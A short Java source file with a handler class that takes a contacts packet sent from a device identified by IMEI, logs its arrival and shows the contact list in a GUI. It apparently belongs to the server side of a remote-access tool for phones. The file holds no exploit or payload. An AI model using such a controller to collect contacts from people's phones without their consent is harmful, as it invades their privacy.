package handler;

import gui.GUI;
import server.Server;
import Packet.ContactsPacket;
import Packet.Packet;

public class ContactsHandler implements PacketHandler {
	
	private GUI gui;
	private int channel;
	private String imei;
	
	public ContactsHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Contacts data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		ContactsPacket packet = (ContactsPacket) p;
		gui.updateContacts(imei, packet.getList());
	}
}
